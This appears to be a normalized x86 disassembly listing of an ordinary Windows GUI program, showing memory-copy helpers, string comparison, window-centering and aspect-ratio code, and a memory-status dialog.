push ebx
push esi
push edi
add ecx 0xc
add eax 0xc
cmp ecx edx
jne r-xdata
mov esi ecx
mov ebx [ esi ]
mov edi eax
mov [ edi ] ebx
mov ebx [ esi + 0x4 ]
mov [ edi + 0x4 ] ebx
mov esi [ esi + 0x8 ]
mov [ edi + 0x8 ] esi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
sub_45f620
mov edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp edx ebx
je r-xdata
pop ebx
retn
push esi
push edi
add edx 0xdc
add eax 0xdc
cmp edx ebx
jne r-xdata
mov ecx 0x37
mov esi edx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
sub_45f660
mov edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp edx ebx
je r-xdata
pop ebx
retn
push esi
push edi
add edx 0x1a0
add eax 0x1a0
cmp edx ebx
jne r-xdata
mov ecx 0x68
mov esi edx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
sub_45f6a0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp ecx esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
inc eax
inc ecx
cmp ecx esi
jne r-xdata
mov dl [ ecx ]
mov [ eax ] dl
sub_45f6d0
mov edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp edx ebx
je r-xdata
pop ebx
retn
push esi
push edi
add edx 0x14
add eax 0x14
cmp edx ebx
jne r-xdata
mov ecx 0x5
mov esi edx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
sub_45f700
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp ecx edx
mov eax [ esp + 0xc ]
je r-xdata
retn
push esi
add ecx 0x8
add eax 0x8
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
test eax eax
je r-xdata
pop esi
sub_45f730
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
mov eax [ ebp + 0x18 ]
mov [ esp + 0x8 ] eax
cmp eax 0x10
push esi
lea eax [ ebp + 0x4 ]
push edi
mov [ esp + 0x18 ] eax
jb r-xdata
push eax
call sub_457fd0
mov esi [ esp + 0x20 ]
mov ebx eax
mov eax [ esi + 0x18 ]
add esp 0x4
cmp eax 0x10
mov [ esp + 0x1c ] eax
lea edi [ esi + 0x4 ]
jb r-xdata
mov eax [ eax ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
jle r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
pop ecx
retn 0x8
push eax
call sub_457fd0
add esp 0x4
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ esi + 0x1c ]
mov ecx 0x10
and eax ecx
and edx ecx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
pop ecx
retn 0x8
cmp [ esp + 0x1c ] ecx
jb r-xdata
pop edi
pop esi
test eax eax
pop ebp
setne al
pop ebx
pop ecx
retn 0x8
cmp [ esp + 0x10 ] ecx
mov eax [ esp + 0x18 ]
jb r-xdata
mov edi [ edi ]
push 0xffffffff
push edi
push 0xffffffff
push eax
push 0x1
push 0x800
call [ CompareStringA@IAT ]
dec eax
pop edi
neg eax
pop esi
sbb al al
pop ebp
inc al
pop ebx
pop ecx
retn 0x8
mov eax [ eax ]
sub_45f810
mov eax [ esp + 0x8 ]
sub esp 0x148
sub eax 0x110
push esi
je r-xdata
mov edx [ rw-data ]
mov esi [ GetWindowRect@IAT ]
push ebx
push ebp
push edi
lea ecx [ esp + 0x18 ]
push ecx
push edx
call esi
mov edi [ esp + 0x15c ]
lea eax [ esp + 0x28 ]
push eax
push edi
call esi
mov ebp [ esp + 0x34 ]
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x24 ]
mov esi [ esp + 0x30 ]
sub eax ebp
mov ebp [ esp + 0x20 ]
sub eax ecx
add eax edx
cdq
sub eax edx
sar eax 0x1
push 0x5
add eax ecx
mov ecx [ esp + 0x1c ]
xor ebx ebx
push ebx
push ebx
push eax
mov eax [ esp + 0x38 ]
sub eax esi
sub eax ecx
add eax ebp
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push ebx
push edi
call [ SetWindowPos@IAT ]
mov edi [ rw-data ]
mov [ esp + 0x10 ] ebx
xor ebp ebp
lea esi [ edi + 0x20 ]
lea ebx [ ebx ]
dec eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
xor eax eax
pop esi
add esp 0x148
retn
mov eax [ esp + 0x158 ]
cmp ax 0x1
jne r-xdata
lea ecx [ esp + 0x38 ]
push ecx
call [ GlobalMemoryStatus@IAT ]
mov ecx [ esp + 0x44 ]
xor eax eax
pop edi
cmp ebp eax
pop ebp
pop ebx
ja r-xdata
mov edx [ esi ]
add [ esp + 0x10 ] edx
mov eax [ esi + 0x4 ]
adc ebp eax
inc ebx
add esi 0x70
jmp r-xdata
cmp ebx edx
jge r-xdata
cmp ax 0x2
jne r-xdata
mov esi [ esp + 0x150 ]
push 0xbbb
push esi
call [ IsDlgButtonChecked@IAT ]
push 0x1
push esi
mov [ rw-data ] eax
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
add esp 0x148
retn
mov eax [ esp + 0x4 ]
add ecx 0x80000
shr ecx 0x14
push ecx
add eax 0x80000
shr eax 0x14
push eax
lea ecx [ esp + 0x54 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ esp + 0x160 ]
add esp 0x10
lea edx [ esp + 0x4c ]
push edx
push 0xbbc
push eax
call [ SetDlgItemTextA@IAT ]
jb r-xdata
test edi edi
jne r-xdata
mov eax [ esp + 0x150 ]
push 0x2
push eax
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
add esp 0x148
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ esp + 0x4 ] ecx
jae r-xdata
mov edx [ esp + 0x150 ]
push 0x1
push edx
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
add esp 0x148
retn
sub_45f9e0
mov eax [ rw-data ]
sub esp 0x28
cmp eax 0x1
jne r-xdata
add esp 0x28
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x70
mov edx [ eax + ecx + 0x50 ]
push ebx
mov ebx [ eax + ecx + 0x4c ]
imul ebx [ rw-data ]
add eax ecx
mov ecx [ rw-data ]
push ebp
push esi
push edi
lea eax [ esp + 0x28 ]
push eax
push ecx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x1c ] edx
call [ GetClientRect@IAT ]
mov edx [ rw-data ]
push 0xfffffff0
push edx
call [ GetWindowLongA@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x2
mov ebp eax
call esi
push 0x3
mov [ esp + 0x24 ] eax
call esi
mov esi [ esp + 0x28 ]
mov edi [ esp + 0x30 ]
mov edx [ esp + 0x2c ]
sub edi esi
mov esi [ esp + 0x34 ]
sub esi edx
test ebp 0x200000
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] edi
mov [ esp + 0x10 ] esi
je r-xdata
test ebp 0x100000
je r-xdata
add edi [ esp + 0x20 ]
mov [ esp + 0x18 ] edi
mov al [ rw-data ]
test al al
je r-xdata
add esi eax
mov [ esp + 0x10 ] esi
mov eax esi
mov ecx edi
imul eax ebx
imul ecx [ esp + 0x14 ]
cmp ecx eax
jle r-xdata
mov eax [ rw-data ]
mov ebp 0x1
cmp eax ebp
jne r-xdata
jge r-xdata
sub edi [ esp + 0x20 ]
mov [ esp + 0x20 ] edi
fild [ esp + 0x20 ]
jmp r-xdata
cmp [ rw-data ] ebp
jne r-xdata
mov eax [ rw-data ]
push eax
call [ GetMenu@IAT ]
test eax eax
je r-xdata
fild [ esp + 0x18 ]
sub esi [ esp + 0x24 ]
mov [ esp + 0x24 ] esi
fild [ esp + 0x24 ]
fidiv [ esp + 0x14 ]
jmp r-xdata
fidiv [ esp + 0x1c ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xf
call [ GetSystemMetrics@IAT ]
add esi eax
mov [ esp + 0x10 ] esi
fild [ esp + 0x8 ]
fidiv [ esp + 0xc ]
fstp [ rw-data ]
fild [ esp ]
fidiv [ esp + 0x4 ]
fstp [ rw-data ]
add esp 0x28
retn
cmp ecx eax
fstp [ rw-data ]
pop edi
pop esi
pop ebp
pop ebx
jle r-xdata
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
add esi 0x14
mov [ esp + 0x10 ] esi
sub_45fb70
push 0xffffffff
push sub_4c09d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x38 ]
test edi edi
mov [ esp + 0x30 ] 0x1
jne r-xdata
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
call sub_45bab0
mov eax [ rw-data ]
add esp 0x8
push eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x20 ] esp
mov ecx esp
je r-xdata
mov eax [ rw-data ]
push edi
push edi
push eax
call [ InvalidateRect@IAT ]
mov esi [ esp + 0x3c ]
test esi esi
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x24 ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
fld [ r--data ]
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov [ ecx ] eax
push 0x1
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x38 ]
push edx
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x34 ]
push ecx
call sub_45ddb0
mov ecx [ rw-data ]
add esp 0x20
xor eax eax
test ecx ecx
mov [ esp + 0x10 ] 0x0
jne r-xdata
inc [ eax + 0xd48 ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov [ esp + 0x14 ] eax
call esi
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
jge r-xdata
sub ebx [ esp + 0x10 ]
mov [ esp + 0x20 ] ebx
fild [ esp + 0x20 ]
push ecx
fidiv [ esp + 0x1c ]
fstp [ esp + 0x14 ]
fild [ esp + 0x18 ]
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
add esp 0x4
cmp eax ebp
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov ebx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
imul ecx ebx
mov ebp [ esp + 0x20 ]
mov esi [ esp + 0x3c ]
imul edx ebp
cmp ecx edx
jle r-xdata
test esi esi
push ecx
mov [ esp + 0x28 ] esp
mov eax esp
je r-xdata
sub ebp eax
mov [ esp + 0x20 ] ebp
fild [ esp + 0x20 ]
push ecx
fidiv [ esp + 0x18 ]
fstp [ esp + 0x14 ]
fild [ esp + 0x1c ]
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
add esp 0x4
cmp eax ebx
jge r-xdata
mov [ eax ] esi
push ecx
mov ecx [ edi + 0xd48 ]
inc ecx
mov eax esp
mov [ edi + 0xd48 ] ecx
mov [ eax ] edi
mov [ esp + 0x2c ] esp
call sub_45e630
fstp [ esp + 0x18 ]
add esp 0x8
inc [ esi + 0xd48 ]
mov eax [ edi + 0xd48 ]
dec eax
mov [ esp + 0x30 ] 0x0
mov [ edi + 0xd48 ] eax
jne r-xdata
test esi esi
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x28 ]
fld [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x24
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_45fd90
push 0xffffffff
push sub_4c09d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push ebp
push esi
push edi
mov ebx [ esp + 0x3c ]
test ebx ebx
mov esi [ esp + 0x40 ]
mov edi 0x1
mov [ esp + 0x34 ] edi
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov eax [ rw-data ]
je r-xdata
test esi esi
mov eax [ rw-data ]
mov [ esp + 0x3c ] eax
mov [ esp + 0x34 ] 0xffffffff
je r-xdata
cmp eax 0x6
ja r-xdata
test esi esi
push ecx
mov [ esp + 0x14 ] esp
mov eax esp
je r-xdata
fld [ esp + 0x3c ]
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
dec [ esi + 0xd48 ]
jne r-xdata
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx ebx
call sub_4440b0
mov ebp eax
mov [ esp + 0x14 ] ebp
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx ebx
push edx
call sub_444100
cmp [ rw-data ] edi
mov [ esp + 0x1c ] eax
jne r-xdata
jmp [ eax * 4 + jump_table_46028c ]
mov [ eax ] esi
mov edx [ ebx + 0xd48 ]
push ecx
inc edx
mov eax esp
mov [ ebx + 0xd48 ] edx
mov [ esp + 0x18 ] esp
mov [ eax ] ebx
call sub_45ef80
add esp 0x8
inc [ esi + 0xd48 ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
test esi esi
je r-xdata
fild [ esp + 0x14 ]
push ecx
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x20 ]
mov esi eax
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
mov ebp eax
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
push ecx
lea edx [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
call sub_40a740
push ecx
lea eax [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x18 ] esp
push eax
call sub_40a740
call sub_45fb70
jmp r-xdata
push ecx
lea edx [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
call sub_40a740
push ecx
lea eax [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x18 ] esp
push eax
call sub_40a740
call sub_45e630
jmp r-xdata
push ecx
lea edx [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
call sub_40a740
push ecx
lea eax [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x18 ] esp
push eax
call sub_40a740
push 0x0
call sub_45e820
add esp 0xc
jmp r-xdata
push ecx
lea edx [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
call sub_40a740
push ecx
lea eax [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x18 ] esp
push eax
call sub_40a740
push edi
call sub_45e820
add esp 0xc
jmp r-xdata
push ecx
lea edx [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
call sub_40a740
push ecx
lea eax [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x18 ] esp
push eax
call sub_40a740
call sub_45eba0
jmp r-xdata
push ecx
lea edx [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x14 ] esp
push edx
call sub_40a740
push ecx
lea eax [ esp + 0x44 ]
mov ecx esp
mov [ esp + 0x18 ] esp
push eax
call sub_40a740
call sub_45ed70
mov [ esp + 0x18 ] ebp
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx esi
push eax
call sub_4440b0
mov [ esp + 0x18 ] eax
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx esi
call sub_444100
jmp r-xdata
xor edi edi
mov eax [ ebx ]
push eax
call sub_4a8dd0
add esp 0x4
test al al
je r-xdata
add esp 0x8
fstp [ esp + 0x10 ]
fild [ esp + 0x14 ]
push ecx
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x20 ]
mov esi eax
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
add esp 0x4
test edi edi
mov ebp eax
mov [ esp + 0x24 ] ebp
je r-xdata
cmp eax 0x5
jne r-xdata
mov edi eax
mov eax [ rw-data ]
cmp eax 0x6
mov [ esp + 0x20 ] edi
je r-xdata
mov ecx [ esp + 0x44 ]
xor edx edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] esi
mov [ ecx + 0xc ] ebp
mov ecx [ esp + 0x48 ]
mov [ ecx + 0xc ] eax
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] edi
mov eax [ ebx + 0xd48 ]
dec eax
mov [ esp + 0x34 ] dl
mov [ ebx + 0xd48 ] eax
jne r-xdata
mov eax [ ebx ]
push eax
call sub_4a8f50
mov edi eax
mov eax [ ebx ]
push eax
call sub_4a90d0
mov ecx [ rw-data ]
mov edx 0x1
add esp 0x8
cmp ecx edx
jne r-xdata
xor edi edi
fild [ esp + 0x18 ]
push ecx
fimul [ esp + 0x28 ]
fidiv [ esp + 0x24 ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov edi eax
jmp r-xdata
fild [ esp + 0x14 ]
push ecx
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x20 ]
mov esi eax
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x1c ]
mov ebp eax
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x24 ]
mov edi eax
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
add esp 0x4
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi [ esp + 0x40 ]
test esi esi
mov [ esp + 0x34 ] 0xffffffff
je r-xdata
mov ecx ebx
call sub_43fe30
push ebx
call j_sub_4b66ed#2
add esp 0x4
cmp ecx 0x2
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
fld [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x28
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
cmp ecx edx
jne r-xdata
cmp [ rw-data ] edx
je r-xdata
fild [ esp + 0x14 ]
push ecx
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x20 ]
mov esi eax
mov [ esp + 0x28 ] esi
fmul [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
mov ebp eax
mov eax [ esp + 0x1c ]
add esp 0x4
test eax eax
mov edi esi
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
cmp ecx edx
jne r-xdata
cmp [ rw-data ] edx
je r-xdata
add eax edi
cmp esi eax
jle r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
sub eax edi
add eax esi
cmp esi eax
jle r-xdata
xor eax eax
jmp r-xdata
fild [ esp + 0x20 ]
push ecx
fimul [ esp + 0x28 ]
fidiv [ esp + 0x1c ]
fstp [ esp ]
call sub_452500
add esp 0x4
jmp r-xdata
add eax edi
cmp ebp eax
jle r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
sub eax edi
add eax ebp
cmp ebp eax
jle r-xdata
mov esi eax
xor edi edi
xor eax eax
jmp r-xdata
mov esi eax
xor edi edi
xor eax eax
jmp r-xdata
mov ebp edi
sub ebp edi
xor edi edi
xor eax eax
jmp r-xdata
sub_4602b0
push esi
mov esi [ ecx + 0xc ]
mov eax esi
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
sub esi edx
mov edx [ ecx + 0x8 ]
cmp edx eax
ja r-xdata
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax * 4 ]
lea eax [ edx + esi * 4 ]
pop esi
retn
sub eax edx
sub_4602e0
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
retn
mov edx [ ecx + 0xc ]
push edi
mov edi [ ecx + 0x8 ]
inc edx
shl edi 0x2
cmp edi edx
mov [ ecx + 0xc ] edx
pop edi
ja r-xdata
dec eax
test eax eax
mov [ ecx + 0x10 ] eax
jne r-xdata
mov [ ecx + 0xc ] 0x0
mov [ ecx + 0xc ] eax
sub_460310
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
xor ebx ebx
cmp eax ebx
push edi
je r-xdata
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
mov edi edi
mov edx [ esi + 0x4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov edi edi
cmp [ esi + 0x10 ] ebx
jne r-xdata
dec eax
cmp eax ebx
mov [ esi + 0x10 ] eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + edi * 4 - 0x4 ]
dec edi
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp edi ebx
ja r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
mov [ esi + 0xc ] ebx
sub_460370
push 0x90
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x88 ] 0x1
mov [ eax + 0x89 ] 0x0
retn
mov [ ecx ] 0x0
sub_4603b0
push 0x18
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x15 ] 0x0
retn
mov [ ecx ] 0x0
sub_4603f0
push 0x18
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
retn 0x14
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x10 ]
mov [ eax + 0x4 ] edx
mov edx [ ecx ]
mov [ eax + 0xc ] edx
mov ecx [ ecx + 0x4 ]
mov dl [ esp + 0x14 ]
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] dl
mov [ eax + 0x15 ] 0x0
sub_460430
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x15 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_460430
mov esi [ esi ]
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x15 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_460470
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_45f450
add esp 0x14
mov eax esi
pop esi
retn
sub_4604b0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
cmp eax ecx
je r-xdata
retn
mov edx [ esp + 0xc ]
push ebx
push esi
push edi
mov esi edx
mov ebx [ esi ]
mov edi eax
mov [ edi ] ebx
mov ebx [ esi + 0x4 ]
mov [ edi + 0x4 ] ebx
mov esi [ esi + 0x8 ]
add eax 0xc
cmp eax ecx
mov [ edi + 0x8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
sub_4604f0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_45f4c0
add esp 0x14
mov eax esi
pop esi
retn
sub_460530
mov edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp edx ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi edx
mov edi eax
add edx 0xdc
mov ecx 0x37
add eax 0xdc
cmp edx ebx
[ edi ] [ esi ]
jne r-xdata
sub_460570
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_45f500
add esp 0x14
mov eax esi
pop esi
retn
sub_4605b0
mov edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
cmp edx ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi edx
mov edi eax
add edx 0x1a0
mov ecx 0x68
add eax 0x1a0
cmp edx ebx
[ edi ] [ esi ]
jne r-xdata
sub_4605f0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_45f550
add esp 0x14
mov eax esi
pop esi
retn
sub_460630
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
push esi
mov esi [ esp + 0xc ]
cmp esi eax
je r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] ecx
pop esi
retn
mov dl [ eax - 0x1 ]
dec ecx
dec eax
cmp eax esi
mov [ ecx ] dl
jne r-xdata
sub_460660
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_45f5a0
add esp 0x14
mov eax esi
pop esi
retn
sub_4606a0
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
mov edx [ esp + 0xc ]
push ebx
push esi
mov ecx eax
mov eax [ esp + 0xc ]
push edi
add eax 0xc
dec ecx
jne r-xdata
mov esi edx
mov ebx [ esi ]
mov edi eax
mov [ edi ] ebx
mov ebx [ esi + 0x4 ]
mov [ edi + 0x4 ] ebx
mov esi [ esi + 0x8 ]
mov [ edi + 0x8 ] esi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
sub_4606e0
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov edx eax
mov eax [ esp + 0xc ]
push edi
add eax 0xdc
dec edx
jne r-xdata
mov ecx 0x37
mov esi ebx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
sub_460710
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov edx eax
mov eax [ esp + 0xc ]
push edi
add eax 0x1a0
dec edx
jne r-xdata
mov ecx 0x68
mov esi ebx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
sub_460740
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
push esi
mov esi [ esp + 0x10 ]
mov ecx eax
mov eax [ esp + 0x8 ]
inc eax
dec ecx
jne r-xdata
mov dl [ esi ]
mov [ eax ] dl
test eax eax
je r-xdata
pop esi
sub_460770
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov edx eax
mov eax [ esp + 0xc ]
push edi
add eax 0x14
dec edx
jne r-xdata
mov ecx 0x5
mov esi ebx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
sub_4607a0
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
mov ecx [ esp + 0xc ]
mov edx eax
mov eax [ esp + 0x4 ]
push esi
add eax 0x8
dec edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
test eax eax
je r-xdata
